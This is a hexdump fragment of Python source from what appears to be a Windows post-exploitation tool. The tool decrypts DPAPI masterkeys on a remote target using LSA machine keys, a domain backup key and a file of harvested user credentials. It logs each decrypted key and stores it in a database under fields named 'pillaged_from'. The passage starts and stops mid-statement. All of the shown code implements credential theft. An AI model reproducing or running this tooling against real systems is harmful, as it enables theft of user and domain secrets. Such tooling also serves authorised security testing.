-00014b00: 6765 745f 6970 7d5d 2044 6563 7279 7074  get_ip}] Decrypt
-00014b10: 696f 6e20 7375 6363 6573 7366 756c 6c20  ion successfull 
-00014b20: 7b62 636f 6c6f 7273 2e45 4e44 437d 3a20  {bcolors.ENDC}: 
-00014b30: 7b64 6563 7279 7074 6564 5f6d 6173 7465  {decrypted_maste
-00014b40: 726b 6579 7d22 290a 0909 0909 0909 0975  rkey}")........u
-00014b50: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
-00014b60: 696c 655b 6775 6964 5d5b 2773 7461 7475  ile[guid]['statu
-00014b70: 7327 5d20 3d20 2764 6563 7279 7074 6564  s'] = 'decrypted
-00014b80: 270a 0909 0909 0909 0975 7365 722e 6d61  '........user.ma
-00014b90: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
-00014ba0: 6964 5d5b 276b 6579 275d 203d 2064 6563  id]['key'] = dec
-00014bb0: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
-00014bc0: 0a09 0909 0909 0909 2320 7573 6572 2e6d  ........# user.m
-00014bd0: 6173 7465 726b 6579 735b 6c6f 6361 6c66  asterkeys[localf
-00014be0: 696c 655d 203d 2064 6563 7279 7074 6564  ile] = decrypted
-00014bf0: 5f6d 6173 7465 726b 6579 0a09 0909 0909  _masterkey......
-00014c00: 0909 7573 6572 2e74 7970 6520 3d20 274d  ..user.type = 'M
-00014c10: 4143 4849 4e45 2d55 5345 5227 0a09 0909  ACHINE-USER'....
-00014c20: 0909 0909 7573 6572 2e74 7970 655f 7661  ....user.type_va
-00014c30: 6c69 6461 7465 6420 3d20 5472 7565 0a09  lidated = True..
-00014c40: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-00014c50: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
-00014c60: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-00014c70: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
-00014c80: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d44  bcolors.OKBLUE}D
-00014c90: 6563 7279 7074 696f 6e20 7375 6363 6573  ecryption succes
-00014ca0: 7366 756c 6c20 7b62 636f 6c6f 7273 2e45  sfull {bcolors.E
-00014cb0: 4e44 437d 206f 6620 4d61 7374 6572 6b65  NDC} of Masterke
-00014cc0: 7920 7b67 7569 647d 2066 6f72 204d 6163  y {guid} for Mac
-00014cd0: 6869 6e65 207b 6263 6f6c 6f72 732e 4f4b  hine {bcolors.OK
-00014ce0: 4752 4545 4e7d 207b 7573 6572 2e75 7365  GREEN} {user.use
-00014cf0: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
-00014d00: 4e44 437d 2020 5c6e 4b65 793a 207b 6465  NDC}  \nKey: {de
-00014d10: 6372 7970 7465 645f 6d61 7374 6572 6b65  crypted_masterke
-00014d20: 797d 2229 0a09 0909 0909 0909 7365 6c66  y}")........self
-00014d30: 2e64 622e 7570 6461 7465 5f6d 6173 7465  .db.update_maste
-00014d40: 726b 6579 2866 696c 655f 7061 7468 3d75  rkey(file_path=u
-00014d50: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
-00014d60: 696c 655b 6775 6964 5d5b 2770 6174 6827  ile[guid]['path'
-00014d70: 5d2c 2067 7569 643d 6775 6964 2c0a 0909  ], guid=guid,...
-00014d80: 0909 0909 0909 0909 0909 0920 7374 6174  ........... stat
-00014d90: 7573 3d75 7365 722e 6d61 7374 6572 6b65  us=user.masterke
-00014da0: 7973 5f66 696c 655b 6775 6964 5d5b 2773  ys_file[guid]['s
-00014db0: 7461 7475 7327 5d2c 0a09 0909 0909 0909  tatus'],........
-00014dc0: 0909 0909 0909 2064 6563 7279 7074 6564  ...... decrypted
-00014dd0: 5f77 6974 683d 224d 4143 4849 4e45 2d55  _with="MACHINE-U
-00014de0: 5345 5222 2c20 6465 6372 7970 7465 645f  SER", decrypted_
-00014df0: 7661 6c75 653d 6465 6372 7970 7465 645f  value=decrypted_
-00014e00: 6d61 7374 6572 6b65 792c 0a09 0909 0909  masterkey,......
-00014e10: 0909 0909 0909 0909 2070 696c 6c61 6765  ........ pillage
-00014e20: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
-00014e30: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
-00014e40: 7461 7267 6574 5f69 702c 0a09 0909 0909  target_ip,......
-00014e50: 0909 0909 0909 0909 2070 696c 6c61 6765  ........ pillage
-00014e60: 645f 6672 6f6d 5f75 7365 726e 616d 653d  d_from_username=
-00014e70: 7573 6572 2e75 7365 726e 616d 6529 0a09  user.username)..
-00014e80: 0909 0909 0909 7265 7475 726e 2075 7365  ......return use
-00014e90: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
-00014ea0: 655b 6775 6964 5d0a 0909 0909 0909 656c  e[guid].......el
-00014eb0: 7365 3a0a 0909 0909 0909 0973 656c 662e  se:........self.
-00014ec0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00014ed0: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00014ee0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00014ef0: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
-00014f00: 4e49 4e47 7d20 4d41 4348 494e 452d 5553  NING} MACHINE-US
-00014f10: 4552 5f4b 6579 2066 726f 6d20 4c53 4120  ER_Key from LSA 
-00014f20: 7b6b 6579 2e64 6563 6f64 6528 2775 7466  {key.decode('utf
-00014f30: 2d38 2729 7d20 6361 6e27 7420 6465 636f  -8')} can't deco
-00014f40: 6465 207b 6263 6f6c 6f72 732e 4f4b 424c  de {bcolors.OKBL
-00014f50: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
-00014f60: 657d 7b62 636f 6c6f 7273 2e57 4152 4e49  e}{bcolors.WARNI
-00014f70: 4e47 7d20 204d 6173 7465 726b 6579 207b  NG}  Masterkey {
-00014f80: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
-00014f90: 4443 7d22 290a 0909 0909 0965 7863 6570  DC}")......excep
-00014fa0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-00014fb0: 783a 0a09 0909 0909 0973 656c 662e 6c6f  x:.......self.lo
-00014fc0: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00014fd0: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-00014fe0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00014ff0: 2045 7863 6570 7469 6f6e 207b 6263 6f6c   Exception {bcol
-00015000: 6f72 732e 5741 524e 494e 477d 204d 4143  ors.WARNING} MAC
-00015010: 4849 4e45 2d55 5345 525f 4b65 7920 6672  HINE-USER_Key fr
-00015020: 6f6d 204c 5341 207b 6b65 792e 6465 636f  om LSA {key.deco
-00015030: 6465 2827 7574 662d 3827 297d 2063 616e  de('utf-8')} can
-00015040: 2774 2064 6563 6f64 6520 7b62 636f 6c6f  't decode {bcolo
-00015050: 7273 2e4f 4b42 4c55 457d 7b75 7365 722e  rs.OKBLUE}{user.
-00015060: 7573 6572 6e61 6d65 7d7b 6263 6f6c 6f72  username}{bcolor
-00015070: 732e 5741 524e 494e 477d 2020 4d61 7374  s.WARNING}  Mast
-00015080: 6572 6b65 7920 7b67 7569 647d 7b62 636f  erkey {guid}{bco
-00015090: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-000150a0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-000150b0: 6465 6275 6728 6578 290a 0909 0909 656c  debug(ex).....el
-000150c0: 7365 3a0a 0909 0909 0974 6573 7465 645f  se:......tested_
-000150d0: 7479 7065 2e61 7070 656e 6428 274d 4143  type.append('MAC
-000150e0: 4849 4e45 2d55 5345 5227 290a 0909 0909  HINE-USER').....
-000150f0: 0969 6620 7573 6572 2e74 7970 655f 7661  .if user.type_va
-00015100: 6c69 6461 7465 6420 3d3d 2046 616c 7365  lidated == False
-00015110: 2061 6e64 206e 6f74 2075 7365 722e 6973   and not user.is
-00015120: 5f61 6463 6f6e 6e65 6374 3a0a 0909 0909  _adconnect:.....
-00015130: 0909 7265 7475 726e 2073 656c 662e 6465  ..return self.de
-00015140: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
-00015150: 7573 6572 2c20 6775 6964 2c20 7479 7065  user, guid, type
-00015160: 3d27 444f 4d41 494e 272c 2074 6573 7465  ='DOMAIN', teste
-00015170: 645f 7479 7065 3d74 6573 7465 645f 7479  d_type=tested_ty
-00015180: 7065 290a 0909 0909 0969 6620 2744 4f4d  pe)......if 'DOM
-00015190: 4149 4e27 206e 6f74 2069 6e20 7465 7374  AIN' not in test
-000151a0: 6564 5f74 7970 653a 0a09 0909 0909 0972  ed_type:.......r
-000151b0: 6574 7572 6e20 7365 6c66 2e64 6563 7279  eturn self.decry
-000151c0: 7074 5f6d 6173 7465 726b 6579 2875 7365  pt_masterkey(use
-000151d0: 722c 2067 7569 642c 2074 7970 653d 2744  r, guid, type='D
-000151e0: 4f4d 4149 4e27 2c20 7465 7374 6564 5f74  OMAIN', tested_t
-000151f0: 7970 653d 7465 7374 6564 5f74 7970 6529  ype=tested_type)
-00015200: 0a0a 0909 0965 6c69 6620 7479 7065 203d  .....elif type =
-00015210: 3d20 2744 4f4d 4149 4e27 2061 6e64 2073  = 'DOMAIN' and s
-00015220: 656c 662e 6f70 7469 6f6e 732e 7076 6b20  elf.options.pvk 
-00015230: 6973 206e 6f74 204e 6f6e 653a 0a09 0909  is not None:....
-00015240: 0923 2046 6f72 2041 4443 6f6e 6e65 6374  .# For ADConnect
-00015250: 0a09 0909 0969 6620 7573 6572 2e69 735f  .....if user.is_
-00015260: 6164 636f 6e6e 6563 7420 6973 2054 7275  adconnect is Tru
-00015270: 6520 616e 6420 274d 4143 4849 4e45 2d55  e and 'MACHINE-U
-00015280: 5345 5227 206e 6f74 2069 6e20 7465 7374  SER' not in test
-00015290: 6564 5f74 7970 653a 0a09 0909 0909 7265  ed_type:......re
-000152a0: 7475 726e 2073 656c 662e 6465 6372 7970  turn self.decryp
-000152b0: 745f 6d61 7374 6572 6b65 7928 7573 6572  t_masterkey(user
-000152c0: 2c20 6775 6964 2c20 7479 7065 3d27 4d41  , guid, type='MA
-000152d0: 4348 494e 452d 5553 4552 272c 2074 6573  CHINE-USER', tes
-000152e0: 7465 645f 7479 7065 3d74 6573 7465 645f  ted_type=tested_
-000152f0: 7479 7065 290a 0909 0909 2320 5472 7920  type).....# Try 
-00015300: 6465 2064 6563 7279 7074 206d 6173 7465  de decrypt maste
-00015310: 726b 6579 2066 696c 650a 0909 0909 7365  rkey file.....se
-00015320: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00015330: 280a 0909 0909 0966 225b 7b73 656c 662e  (......f"[{self.
-00015340: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00015350: 707d 5d20 5b2e 2e2e 5d20 4465 6372 7970  p}] [...] Decryp
-00015360: 7469 6e67 207b 6263 6f6c 6f72 732e 4f4b  ting {bcolors.OK
-00015370: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
-00015380: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
-00015390: 437d 206d 6173 7465 726b 6579 207b 6775  C} masterkey {gu
-000153a0: 6964 7d20 7769 7468 2044 6f6d 6169 6e20  id} with Domain 
-000153b0: 4261 636b 7570 6b65 7920 7b73 656c 662e  Backupkey {self.
-000153c0: 6f70 7469 6f6e 732e 7076 6b7d 2229 0a09  options.pvk}")..
-000153d0: 0909 0974 7279 3a0a 0909 0909 096d 796f  ...try:......myo
-000153e0: 7074 696f 6e73 203d 2063 6f70 792e 6465  ptions = copy.de
-000153f0: 6570 636f 7079 2873 656c 662e 6f70 7469  epcopy(self.opti
-00015400: 6f6e 7329 0a09 0909 0909 6d79 6f70 7469  ons)......myopti
-00015410: 6f6e 732e 6669 6c65 203d 206c 6f63 616c  ons.file = local
-00015420: 6669 6c65 2020 2320 4d61 7374 6572 6b65  file  # Masterke
-00015430: 7966 696c 6520 746f 2070 6172 7365 0a09  yfile to parse..
-00015440: 0909 0909 6d79 6f70 7469 6f6e 732e 7573  ....myoptions.us
-00015450: 6572 6e61 6d65 203d 2075 7365 722e 7573  ername = user.us
-00015460: 6572 6e61 6d65 0a09 0909 0909 6d79 6f70  ername......myop
-00015470: 7469 6f6e 732e 7369 6420 3d20 7573 6572  tions.sid = user
-00015480: 2e73 6964 0a09 0909 0909 6d79 6470 6170  .sid......mydpap
-00015490: 6920 3d20 4450 4150 4928 6d79 6f70 7469  i = DPAPI(myopti
-000154a0: 6f6e 732c 2073 656c 662e 6c6f 6767 696e  ons, self.loggin
-000154b0: 6729 0a09 0909 0909 6465 6372 7970 7465  g)......decrypte
-000154c0: 645f 6d61 7374 6572 6b65 7920 3d20 6d79  d_masterkey = my
-000154d0: 6470 6170 692e 6465 6372 7970 745f 6d61  dpapi.decrypt_ma
-000154e0: 7374 6572 6b65 7928 290a 0909 0909 0969  sterkey()......i
-000154f0: 6620 6465 6372 7970 7465 645f 6d61 7374  f decrypted_mast
-00015500: 6572 6b65 7920 213d 202d 3120 616e 6420  erkey != -1 and 
-00015510: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
-00015520: 6b65 7920 213d 204e 6f6e 653a 0a09 0909  key != None:....
-00015530: 0909 0923 2073 656c 662e 6c6f 6767 696e  ...# self.loggin
-00015540: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
-00015550: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00015560: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
-00015570: 4752 4545 4e7d 4465 6372 7970 7469 6f6e  GREEN}Decryption
-00015580: 2073 7563 6365 7373 6675 6c6c 207b 6263   successfull {bc
-00015590: 6f6c 6f72 732e 454e 4443 7d3a 2025 7322  olors.ENDC}: %s"
-000155a0: 2025 2064 6563 7279 7074 6564 5f6d 6173   % decrypted_mas
-000155b0: 7465 726b 6579 290a 0909 0909 0909 7573  terkey).......us
-000155c0: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
-000155d0: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
-000155e0: 275d 203d 2027 6465 6372 7970 7465 6427  '] = 'decrypted'
-000155f0: 0a09 0909 0909 0975 7365 722e 6d61 7374  .......user.mast
-00015600: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-00015610: 5d5b 276b 6579 275d 203d 2064 6563 7279  ]['key'] = decry
-00015620: 7074 6564 5f6d 6173 7465 726b 6579 0a09  pted_masterkey..
-00015630: 0909 0909 0923 2075 7365 722e 6d61 7374  .....# user.mast
-00015640: 6572 6b65 7973 5b6c 6f63 616c 6669 6c65  erkeys[localfile
-00015650: 5d20 3d20 6465 6372 7970 7465 645f 6d61  ] = decrypted_ma
-00015660: 7374 6572 6b65 790a 0909 0909 0909 7573  sterkey.......us
-00015670: 6572 2e74 7970 6520 3d20 2744 4f4d 4149  er.type = 'DOMAI
-00015680: 4e27 0a09 0909 0909 0975 7365 722e 7479  N'.......user.ty
-00015690: 7065 5f76 616c 6964 6174 6564 203d 2054  pe_validated = T
-000156a0: 7275 650a 0909 0909 0909 7365 6c66 2e6c  rue.......self.l
-000156b0: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
-000156c0: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-000156d0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-000156e0: 5d20 7b62 636f 6c6f 7273 2e4f 4b42 4c55  ] {bcolors.OKBLU
-000156f0: 457d 4465 6372 7970 7469 6f6e 2073 7563  E}Decryption suc
-00015700: 6365 7373 6675 6c6c 207b 6263 6f6c 6f72  cessfull {bcolor
-00015710: 732e 454e 4443 7d20 6f66 204d 6173 7465  s.ENDC} of Maste
-00015720: 726b 6579 207b 6775 6964 7d20 666f 7220  rkey {guid} for 
-00015730: 7573 6572 207b 6263 6f6c 6f72 732e 4f4b  user {bcolors.OK
-00015740: 424c 5545 7d20 7b75 7365 722e 7573 6572  BLUE} {user.user
-00015750: 6e61 6d65 7d7b 6263 6f6c 6f72 732e 454e  name}{bcolors.EN
-00015760: 4443 7d20 205c 6e4b 6579 3a20 7b64 6563  DC}  \nKey: {dec
-00015770: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
-00015780: 7d22 290a 0909 0909 0909 7365 6c66 2e64  }").......self.d
-00015790: 622e 7570 6461 7465 5f6d 6173 7465 726b  b.update_masterk
-000157a0: 6579 2866 696c 655f 7061 7468 3d75 7365  ey(file_path=use
-000157b0: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
-000157c0: 655b 6775 6964 5d5b 2770 6174 6827 5d2c  e[guid]['path'],
-000157d0: 2067 7569 643d 6775 6964 2c0a 0909 0909   guid=guid,.....
-000157e0: 0909 0909 0909 0909 2073 7461 7475 733d  ........ status=
-000157f0: 7573 6572 2e6d 6173 7465 726b 6579 735f  user.masterkeys_
-00015800: 6669 6c65 5b67 7569 645d 5b27 7374 6174  file[guid]['stat
-00015810: 7573 275d 2c0a 0909 0909 0909 0909 0909  us'],...........
-00015820: 0909 2064 6563 7279 7074 6564 5f77 6974  .. decrypted_wit
-00015830: 683d 2244 4f4d 4149 4e2d 5056 4b22 2c0a  h="DOMAIN-PVK",.
-00015840: 0909 0909 0909 0909 0909 0909 2064 6563  ............ dec
-00015850: 7279 7074 6564 5f76 616c 7565 3d64 6563  rypted_value=dec
-00015860: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
-00015870: 2c0a 0909 0909 0909 0909 0909 0909 2070  ,............. p
-00015880: 696c 6c61 6765 645f 6672 6f6d 5f63 6f6d  illaged_from_com
-00015890: 7075 7465 725f 6970 3d73 656c 662e 6f70  puter_ip=self.op
-000158a0: 7469 6f6e 732e 7461 7267 6574 5f69 702c  tions.target_ip,
-000158b0: 0a09 0909 0909 0909 0909 0909 0920 7069  ............. pi
-000158c0: 6c6c 6167 6564 5f66 726f 6d5f 7573 6572  llaged_from_user
-000158d0: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
-000158e0: 6d65 290a 0909 0909 0909 7265 7475 726e  me).......return
-000158f0: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
-00015900: 5f66 696c 655b 6775 6964 5d0a 0909 0909  _file[guid].....
-00015910: 0965 6c73 653a 0a09 0909 0909 0973 656c  .else:.......sel
-00015920: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00015930: 0a09 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
-00015940: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00015950: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
-00015960: 524e 494e 477d 446f 6d61 696e 2042 6163  RNING}Domain Bac
-00015970: 6b75 706b 6579 207b 7365 6c66 2e6f 7074  kupkey {self.opt
-00015980: 696f 6e73 2e70 766b 7d20 6361 6e27 7420  ions.pvk} can't 
-00015990: 6465 636f 6465 207b 6263 6f6c 6f72 732e  decode {bcolors.
-000159a0: 4f4b 424c 5545 7d7b 7573 6572 2e75 7365  OKBLUE}{user.use
-000159b0: 726e 616d 657d 7b62 636f 6c6f 7273 2e57  rname}{bcolors.W
-000159c0: 4152 4e49 4e47 7d20 4d61 7374 6572 6b65  ARNING} Masterke
-000159d0: 7920 7b67 7569 647d 202d 3e20 4368 6563  y {guid} -> Chec
-000159e0: 6b69 6e67 2077 6974 6820 4c6f 6361 6c20  king with Local 
-000159f0: 7573 6572 2077 6974 6820 6372 6564 7a7b  user with credz{
-00015a00: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
-00015a10: 0909 0909 0909 2320 6966 2075 7365 722e  ......# if user.
-00015a20: 7479 7065 5f76 616c 6964 6174 6564 203d  type_validated =
-00015a30: 3d20 4661 6c73 653a 0a09 0909 0909 0974  = False:.......t
-00015a40: 6573 7465 645f 7479 7065 2e61 7070 656e  ested_type.appen
-00015a50: 6428 2744 4f4d 4149 4e27 290a 0909 0909  d('DOMAIN').....
-00015a60: 0909 7265 7475 726e 2073 656c 662e 6465  ..return self.de
-00015a70: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
-00015a80: 7573 6572 2c20 6775 6964 2c20 274c 4f43  user, guid, 'LOC
-00015a90: 414c 272c 2074 6573 7465 645f 7479 7065  AL', tested_type
-00015aa0: 3d74 6573 7465 645f 7479 7065 290a 0909  =tested_type)...
-00015ab0: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
-00015ac0: 6f6e 2061 7320 6578 3a0a 0909 0909 0973  on as ex:......s
-00015ad0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00015ae0: 6728 0a09 0909 0909 0966 225b 7b73 656c  g(.......f"[{sel
-00015af0: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00015b00: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
-00015b10: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
-00015b20: 2064 6563 7279 7074 696e 6720 7b62 636f   decrypting {bco
-00015b30: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
-00015b40: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
-00015b50: 6f72 732e 454e 4443 7d20 6d61 7374 6572  ors.ENDC} master
-00015b60: 6b65 7920 7b67 7569 647d 2077 6974 6820  key {guid} with 
-00015b70: 446f 6d61 696e 2042 6163 6b75 706b 6579  Domain Backupkey
-00015b80: 2028 6d6f 7374 206c 696b 656c 7920 7573   (most likely us
-00015b90: 6572 2069 7320 6f6e 6c79 206c 6f63 616c  er is only local
-00015ba0: 2075 7365 7229 202d 3e20 5275 6e6e 696e   user) -> Runnin
-00015bb0: 6720 666f 7220 4c6f 6361 6c20 7573 6572  g for Local user
-00015bc0: 2077 6974 6820 6372 6564 7a7b 6263 6f6c   with credz{bcol
-00015bd0: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
-00015be0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00015bf0: 6275 6728 6622 6578 6365 7074 696f 6e20  bug(f"exception 
-00015c00: 7761 7320 3a20 7b65 787d 2229 0a09 0909  was : {ex}")....
-00015c10: 0909 2320 6966 2075 7365 722e 7479 7065  ..# if user.type
-00015c20: 5f76 616c 6964 6174 6564 203d 3d20 4661  _validated == Fa
-00015c30: 6c73 653a 0a09 0909 0909 7465 7374 6564  lse:......tested
-00015c40: 5f74 7970 652e 6170 7065 6e64 2827 444f  _type.append('DO
-00015c50: 4d41 494e 2729 0a09 0909 0909 7265 7475  MAIN')......retu
-00015c60: 726e 2073 656c 662e 6465 6372 7970 745f  rn self.decrypt_
-00015c70: 6d61 7374 6572 6b65 7928 7573 6572 2c20  masterkey(user, 
-00015c80: 6775 6964 2c20 274c 4f43 414c 272c 2074  guid, 'LOCAL', t
-00015c90: 6573 7465 645f 7479 7065 3d74 6573 7465  ested_type=teste
-00015ca0: 645f 7479 7065 290a 0909 0923 2074 7970  d_type)....# typ
-00015cb0: 653d 3d4c 4f43 414c 0a09 0909 2320 4f6e  e==LOCAL....# On
-00015cc0: 2061 2064 6573 2063 7265 647a 0a09 0909   a des credz....
-00015cd0: 6966 206c 656e 2873 656c 662e 6f70 7469  if len(self.opti
-00015ce0: 6f6e 732e 6372 6564 7a29 203e 2030 2061  ons.credz) > 0 a
-00015cf0: 6e64 2075 7365 722e 6d61 7374 6572 6b65  nd user.masterke
-00015d00: 7973 5f66 696c 655b 6775 6964 5d5b 0a09  ys_file[guid][..
-00015d10: 0909 0927 7374 6174 7573 275d 2021 3d20  ...'status'] != 
-00015d20: 2764 6563 7279 7074 6564 273a 2020 2320  'decrypted':  # 
-00015d30: 6c6f 6361 6c66 696c 6520 6e6f 7420 696e  localfile not in
-00015d40: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
-00015d50: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
-00015d60: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
-00015d70: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-00015d80: 7461 7267 6574 5f69 707d 5d20 5b2e 2e2e  target_ip}] [...
-00015d90: 5d20 5465 7374 696e 6720 6465 636f 6469  ] Testing decodi
-00015da0: 6e67 207b 6263 6f6c 6f72 732e 4f4b 424c  ng {bcolors.OKBL
-00015db0: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
-00015dc0: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
-00015dd0: 204d 6173 7465 726b 6579 207b 6775 6964   Masterkey {guid
-00015de0: 7d20 7769 7468 2063 7265 647a 2229 0a09  } with credz")..
-00015df0: 0909 0966 6f72 2075 7365 726e 616d 6520  ...for username 
-00015e00: 696e 2073 656c 662e 6f70 7469 6f6e 732e  in self.options.
-00015e10: 6372 6564 7a3a 0a09 0909 0909 6966 2075  credz:......if u
-00015e20: 7365 726e 616d 652e 6c6f 7765 7228 2920  sername.lower() 
-00015e30: 696e 2075 7365 722e 7573 6572 6e61 6d65  in user.username
-00015e40: 2e6c 6f77 6572 2829 3a20 2023 2070 6f75  .lower():  # pou
-00015e50: 7220 666f 6e63 7469 6f6e 6e65 7220 6175  r fonctionner au
-00015e60: 7373 6920 6176 6563 206c 6520 2e64 6f6d  ssi avec le .dom
-00015e70: 6169 6e20 6f75 206c 6573 2073 6573 7369  ain ou les sessi
-00015e80: 6f6e 7320 6d75 6c74 6970 6c65 2063 6974  ons multiple cit
-00015e90: 7269 7820 656e 2075 7365 722e 646f 6d61  rix en user.doma
-00015ea0: 696e 2e30 3031 203f 0a09 0909 0909 0923  in.001 ?.......#
-00015eb0: 2073 656c 662e 6c6f 6767 696e 672e 6465   self.logging.de
-00015ec0: 6275 6728 6622 5b7b 7365 6c66 2e6f 7074  bug(f"[{self.opt
-00015ed0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00015ee0: 205b 2e2e 2e5d 2054 6573 7469 6e67 207b   [...] Testing {
-00015ef0: 6c65 6e28 7365 6c66 2e6f 7074 696f 6e73  len(self.options
-00015f00: 2e63 7265 647a 5b75 7365 726e 616d 655d  .credz[username]
-00015f10: 297d 2063 7265 647a 2066 6f72 2075 7365  )} credz for use
-00015f20: 7220 7b75 7365 722e 7573 6572 6e61 6d65  r {user.username
-00015f30: 7d22 290a 0909 0909 0909 2320 666f 7220  }").......# for 
-00015f40: 7465 7374 5f63 7265 6420 696e 2073 656c  test_cred in sel
-00015f50: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
-00015f60: 7573 6572 2e75 7365 726e 616d 655d 3a0a  user.username]:.
-00015f70: 0909 0909 0909 7472 793a 0a09 0909 0909  ......try:......
-00015f80: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00015f90: 6562 7567 280a 0909 0909 0909 0909 6622  ebug(.........f"
-00015fa0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00015fb0: 6172 6765 745f 6970 7d5d 5472 7969 6e67  arget_ip}]Trying
-00015fc0: 2074 6f20 6465 6372 7970 7420 7b62 636f   to decrypt {bco
-00015fd0: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
-00015fe0: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
-00015ff0: 6f72 732e 454e 4443 7d20 4d61 7374 6572  ors.ENDC} Master
-00016000: 6b65 7920 7b67 7569 647d 2077 6974 6820  key {guid} with 
-00016010: 7573 6572 2053 4944 207b 7573 6572 2e73  user SID {user.s
-00016020: 6964 7d20 616e 6420 7b6c 656e 2873 656c  id} and {len(sel
-00016030: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
-00016040: 7573 6572 6e61 6d65 5d29 7d63 7265 6465  username])}crede
-00016050: 6e74 6961 6c28 7329 2066 726f 6d20 6372  ntial(s) from cr
-00016060: 6564 7a20 6669 6c65 2229 0a09 0909 0909  edz file")......
-00016070: 0909 6d79 6f70 7469 6f6e 7320 3d20 636f  ..myoptions = co
-00016080: 7079 2e64 6565 7063 6f70 7928 7365 6c66  py.deepcopy(self
-00016090: 2e6f 7074 696f 6e73 290a 0909 0909 0909  .options).......
-000160a0: 096d 796f 7074 696f 6e73 2e66 696c 6520  .myoptions.file 
-000160b0: 3d20 6c6f 6361 6c66 696c 6520 2023 204d  = localfile  # M
-000160c0: 6173 7465 726b 6579 6669 6c65 2074 6f20  asterkeyfile to 
-000160d0: 7061 7273 650a 0909 0909 0909 0923 206d  parse........# m
-000160e0: 796f 7074 696f 6e73 2e70 6173 7377 6f72  yoptions.passwor
-000160f0: 6420 3d20 7365 6c66 2e6f 7074 696f 6e73  d = self.options
